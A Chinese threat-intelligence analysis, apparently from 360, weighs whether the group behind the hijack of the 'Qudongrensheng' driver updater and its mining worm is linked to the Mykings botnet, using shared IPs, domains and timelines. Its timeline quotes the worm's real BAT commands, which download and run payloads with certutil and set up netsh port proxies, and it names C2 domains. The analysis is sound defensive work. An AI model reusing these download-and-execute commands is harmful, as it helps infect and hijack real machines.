> 原文链接: https://www.anquanke.com//post/id/170493 


# 同一团伙还是栽赃嫁祸？“驱动人生”劫持事件与Mykings家族活动的关联分析


                                阅读量   
                                **175597**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t01e1ad29cdedf53441.png)](https://p1.ssl.qhimg.com/t01e1ad29cdedf53441.png)



## 背景

近期360威胁情报中心发现劫持“驱动人生”的挖矿蠕虫再次活跃并做出了预警（详情可以参见《[劫持“驱动人生”的挖矿蠕虫再次活跃](https://mp.weixin.qq.com/s?__biz=MzI2MDc2MDA4OA==&amp;mid=2247486576&amp;idx=1&amp;sn=dc5ff6a05fac06608365823173d17dae&amp;chksm=ea65fb07dd1272113e4890dd284d19e945b4e0ae803f75671ee46cb3fbd42c54fa9170caac86&amp;scene=0&amp;xtrack=1#rd)》一文），在分析团伙的新活动时360威胁情报中心发现了一些涉及到Mykings家族活动的现象，但未能得出确定性的结论，在此分享出来供业界参考，希望能补充更多维度的信息共同研判。



## 网络基础设施的重叠

在对“驱动人生”劫持事件下载木马的域名dl.haqo.net进行关联分析时，我们注意到其中一个子域名js.haqo.net，在360威胁情报中心的ALPHA平台中被打上Mykings的标签，该域名解析到IP 81.177.135.35 。

[![](https://p4.ssl.qhimg.com/t0110e2a7f59e99b5f5.png)](https://p4.ssl.qhimg.com/t0110e2a7f59e99b5f5.png)

查看81.177.135.35的信息，发现该IP在2018年-2019年的时间段基本上是被Mykings家族所使用，下图可以看到此IP绑定的域名几乎全是Mykings使用的C&amp;C，域名格式为js.xxx.xxx，与Mykings的一些子域名格式一致，并且一直到2019年1月24日Mykings的众多域名依然解析到此IP上。而在2019年1月09日，攻击驱动人生的幕后团伙所使用的域名js.haqo.net也解析到了这个IP。

[![](https://p1.ssl.qhimg.com/t010f9bdc5052aa0470.png)](https://p1.ssl.qhimg.com/t010f9bdc5052aa0470.png)

为了进一步发现更多的关联，使用ALPHA平台的威胁关联分析功能，可以清晰地看到haqo.net下面的三个子域名与Mykings的部分域名之间的关系：

[![](https://p5.ssl.qhimg.com/t019cbaaeb86a89cb6a.png)](https://p5.ssl.qhimg.com/t019cbaaeb86a89cb6a.png)

在对两个事件涉及到的C&amp;C域名进行关联分析时，除了观察域名是否解析到相同的IP，还需要确认使用同一个IP的时间段是否一致，如果时间段有重叠，共用基础设施的可能性加大。我们整理了攻击驱动人生的团伙与Mykings使用上面提到的三个IP的时间段，如下表所示，可以发现两者使用同一IP的时间段是有所重叠的，显示出更强的关联度。
<td width="159"></td><td width="132">域名</td><td width="113">IP</td><td width="95">First_Seen</td><td width="94">Last_Seen</td>

域名

First_Seen
<td width="159">“驱动人生”挖矿蠕虫</td><td width="132">js.haqo.net</td><td width="113">81.177.135.35</td><td width="95">2018/12/25</td><td width="94">2019/1/28</td>

js.haqo.net

2018/12/25
<td width="159">Mykings</td><td width="132">js.mys2016.info</td><td width="113">81.177.135.35</td><td width="95">2018/5/29</td><td width="94">2019/1/27</td>

js.mys2016.info

2018/5/29
<td width="159">Mykings</td><td width="132">js.mykings.pw</td><td width="113">81.177.135.35</td><td width="95">2018/5/25</td><td width="94">2019/1/22</td>

js.mykings.pw

2018/5/25
<td width="159">“驱动人生”挖矿蠕虫</td><td width="132">ups.haqo.net</td><td width="113">66.117.6.174</td><td width="95">2018/12/21</td><td width="94">2018/12/21</td>

ups.haqo.net

2018/12/21
<td width="159">“驱动人生”挖矿蠕虫</td><td width="132">v.haqo.net</td><td width="113">66.117.6.174</td><td width="95">2019/1/7</td><td width="94">2019/1/9</td>

v.haqo.net

2019/1/7
<td width="159">Mykings</td><td width="132">down.mys2018.xyz</td><td width="113">66.117.6.174</td><td width="95">2018/12/12</td><td width="94">2018/12/12</td>

down.mys2018.xyz

2018/12/12
<td width="159">Mykings</td><td width="132">down.1226bye.pw</td><td width="113">66.117.6.174</td><td width="95">2018/12/27</td><td width="94">2019/1/22</td>

down.1226bye.pw

2018/12/27
<td width="159">“驱动人生”挖矿蠕虫</td><td width="132">ups.haqo.net</td><td width="113">223.25.247.152</td><td width="95">2018/12/21</td><td width="94">2019/1/28</td>

ups.haqo.net

2018/12/21
<td width="159">Mykings</td><td width="132">www.cyg2016.xyz</td><td width="113">223.25.247.152</td><td width="95">2018/1/28</td><td width="94">2019/1/22</td>

www.cyg2016.xyz

2018/1/28
<td width="159">Mykings</td><td width="132">down.mys2016.info</td><td width="113">223.25.247.152</td><td width="95">2018/1/26</td><td width="94">2018/2/4</td>

down.mys2016.info

2018/1/26

我们不仅看到了域名解析到IP的重叠情况，还注意到了两个事件相似的HTTP请求：js.haqo.net在2018-12-25首次解析到IP 81.177.135.35上，接着有样本请求了hxxp://js.haqo.net:280/v.sct；2018-12-26日，Mykings的js.mys2016.info也解析都该IP上，有样本请求了hxxp://js.mys2016.info:280/v.sct。看起来两个事件的不同域名同一个时间段解析到同一个IP上，并且使用了同一个端口280，连URL的Path都一样: /v.sct 。

[![](https://p4.ssl.qhimg.com/t01371a8c6b77a4e12e.png)](https://p4.ssl.qhimg.com/t01371a8c6b77a4e12e.png)

Mykings访问hxxp://js.mys2016.info:280/v.sct这个URL的样本如下：

[![](https://p0.ssl.qhimg.com/t01aceecd2ad11e2ce8.png)](https://p0.ssl.qhimg.com/t01aceecd2ad11e2ce8.png)



## 可疑的关联性

基于以上的网络基础设施的重叠和访问请求的相似性，我们是否就可以得到“驱动人生”劫持事件与Mykings背后的团伙是同一个呢？我们的观点是：不一定。

Mykings会配合云端机制发起扫描然后尝试扫描和入侵，因此被捕获的样本量相当多; 驱动人生事件的永恒之蓝挖矿蠕虫也会主动进行传播，被捕获的样本量也不少。但是， hxxp://js.haqo.net:280/v.sct这个链接指向文件无法下载，2018-12-25日VT上首次出现这个URL时，甚至连TCP连接都没能建立起来，网络上也并没有留存任何请求了这个URL的样本或者URL的相应数据。

[![](https://p1.ssl.qhimg.com/t0151c5148dba85e4ff.png)](https://p1.ssl.qhimg.com/t0151c5148dba85e4ff.png)

而VT对于URL的检测是不可靠的（特别是没有获取到相应数据的时候），任何人都可以构造一个完全不存在URL提交检测，这样在搜索对应的域名/IP时，URL或者Downloaded Files将会显示出被构造的URL。

例如随意输入hxxp://js[.]haqo.net:6252/admin.asp，尽管请求没成功什么数据也没有返回，依然有三个引擎产生了告警。而再次搜索js.haqo.net时，关联URL中已然多了一条: hxxp://js[.]haqo.net:6252/admin.asp

[![](https://p2.ssl.qhimg.com/t011e20a517e7b61dfb.png)](https://p2.ssl.qhimg.com/t011e20a517e7b61dfb.png)

[![](https://p5.ssl.qhimg.com/t012b964fb90c9b054f.png)](https://p5.ssl.qhimg.com/t012b964fb90c9b054f.png)

所以尽管看似“驱动人生”劫持木马的幕后团伙跟Mykings有千丝万缕的关系，但是并没有一个确切的能够提供实锤的证据表明他们是同一个团伙或者两个团伙有交流沟通：尽管一些没有被使用的子域名解析到了Mykings掌握的IP上，而且使用的时间段有所重合；两个团伙已知的恶意代码没有太多的相似之处；VT上js.haqo.net的某个URL构造得与Mykings相关性非常强，但却没有实际返回的数据可以用来确认“驱动人生”劫持木马利用到了Mykings的IP对应的服务器资源。



## 时间线

目前360对于“驱动人生”劫持木马事件做了一系列的分析，在这里简单总结一下“驱动人生”时间的时间线：

### 2018年12月14日

驱动人生攻击爆发，内网传播用的永恒之蓝漏洞，下载的payload地址：http://dl.haqo.net/dl.exe

当时的永恒之蓝的攻击模块的BAT内容如下：

cmd.exe /c certutil -urlcache -split -f http://dl.haqo.net/dl.exe c:/install.exe&amp;c:/install.exe&amp;netsh firewall add portopening tcp 65531 DNS&amp;netsh interface portproxy add v4tov4 listenport=65531 connectaddress=1.1.1.1 connectport=53

而从该地址下载的dl.exe（f79cb9d2893b254cc75dfb7f3e454a69）的C2地址为：

[![](https://p2.ssl.qhimg.com/t01a88026588f422fac.png)](https://p2.ssl.qhimg.com/t01a88026588f422fac.png)

### 2018年12月16日

各大安全厂商曝光该攻击，攻击逐步停止。

### 2018年12月27日

永恒之蓝攻击模块攻击成功后在目标机器上运行的bat的内容变更下一阶段的payload地址

从http://dl.haqo.net/dl.exe改成了http://dl.haqo.net/dll.exe；

certutil -urlcache -split -f http://dl.haqo.net/dll.exe c:\installs.exe

netsh interface portproxy add v4tov4 listenport=65532 connectaddress=1.1.1.1 connectport=53

netsh firewall add portopening tcp 65532 DNS2

c:\windows\temp\cm.exe /c c:\installs.exe

taskkill /F /IM cmd.exe

而该地址下载回来的样本（f9144118127ff29d4a49a30b242ceb55）的C2地址为以下3个，增加了[http://img.minicen.ga/i.png](http://img.minicen.ga/i.png)，而该域名为免费域名，注册地址为：freenom.com

[![](https://p4.ssl.qhimg.com/t01c6964f246365cc9d.png)](https://p4.ssl.qhimg.com/t01c6964f246365cc9d.png)

### 2019年1月23日

http://dl.haqo.net/dll.exe的地址的样本变为：

59b18d6146a2aa066f661599c496090d，下图为该样本的传播量：

[![](https://p4.ssl.qhimg.com/t0170bca3f6eaa55a71.png)](https://p4.ssl.qhimg.com/t0170bca3f6eaa55a71.png)

该样本的C2地址变为下图的3个域名，增加了o.beahh.com：

其中 beahh.com域名是2019年1月16日刚注册的。

[![](https://p2.ssl.qhimg.com/t014d41f5982d6765b6.png)](https://p2.ssl.qhimg.com/t014d41f5982d6765b6.png)

[![](https://p1.ssl.qhimg.com/t01cf223b58b5691b91.png)](https://p1.ssl.qhimg.com/t01cf223b58b5691b91.png)



## 总结

360威胁情报中心基于自有的大数据和威胁情报平台对入侵驱动人生的幕后团伙进行了关联分析，发现其所用的IP与Mykings事件团伙的部分IP重合，并且使用时间的段重合，甚至连样本所访问的URL格式、端口都一样。但是两个团伙已知的恶意代码没有太多的相似之处，格式高度一致的URL没有实际上的请求和响应数据，由于VT不可靠的URL检测机制，该URL是否实际存在也是个疑问。

基于看到的事实，有两个猜想值得关注：1、入侵“驱动人生”的幕后黑手与Mykings事件团伙存在联系，甚至可能是同一个团伙。2、“驱动人生”木马的团伙在有意识地积极栽赃嫁祸给Mykings团伙。我们的观点倾向于后者，360威胁情报中心会持续保持跟踪，基于新发现的事实调整自己的看法，也希望安全业界分享自己的发现。



## 参考

360对劫持“驱动人生”的挖矿蠕虫分析报告系列详情如下表：
<td valign="top" width="357">分析文章标题</td><td valign="top" width="78">发布日期</td><td valign="top" width="149">分析团队</td>
<td valign="top" width="357">《利用“驱动人生”升级程序的恶意程序预警》</td><td valign="top" width="78">2018.12.15</td><td valign="top" width="149">360互联网安全中心</td>
<td valign="top" width="357">《驱动人生旗下应用分发恶意代码事件分析 – 一个供应链攻击的案例》</td><td valign="top" width="78">2018.12.17</td><td valign="top" width="149">360威胁情报中心</td>
<td valign="top" width="357">《警报！“永恒之蓝”下载器木马再度更新！》</td><td valign="top" width="78">2018.12.19</td><td valign="top" width="149">360安全卫士</td>
<td valign="top" width="357">《劫持“驱动人生”的挖矿蠕虫再次活跃》</td><td valign="top" width="78">2019.01.24</td><td valign="top" width="149">360威胁情报中心</td>
<td valign="top" width="357">《MyKings: 一个大规模多重僵尸网络》</td><td valign="top" width="78">2018.01.24</td><td valign="top" width="149">360网络安全研究院</td>

[https://cert.360.cn/warning/detail?id=57cc079bc4686dd09981bf034130f1c9](https://cert.360.cn/warning/detail?id=57cc079bc4686dd09981bf034130f1c9)

[https://ti.360.net/blog/articles/an-attack-of-supply-chain-by-qudongrensheng/](https://ti.360.net/blog/articles/an-attack-of-supply-chain-by-qudongrensheng/)

[https://weibo.com/ttarticle/p/show?id=2309404318990783612243](https://weibo.com/ttarticle/p/show?id=2309404318990783612243)

[https://mp.weixin.qq.com/s?__biz=MzI2MDc2MDA4OA==&amp;mid=2247486576&amp;idx=1&amp;sn=dc5ff6a05fac06608365823173d17dae&amp;chksm=ea65fb07dd1272113e4890dd284d19e945b4e0ae803f75671ee46cb3fbd42c54fa9170caac86&amp;scene=0&amp;xtrack=1#rd](https://mp.weixin.qq.com/s?__biz=MzI2MDc2MDA4OA==&amp;mid=2247486576&amp;idx=1&amp;sn=dc5ff6a05fac06608365823173d17dae&amp;chksm=ea65fb07dd1272113e4890dd284d19e945b4e0ae803f75671ee46cb3fbd42c54fa9170caac86&amp;scene=0&amp;xtrack=1#rd)

[https://blog.netlab.360.com/mykings-the-botnet-behind-multiple-active-spreading-botnets/](https://blog.netlab.360.com/mykings-the-botnet-behind-multiple-active-spreading-botnets/)
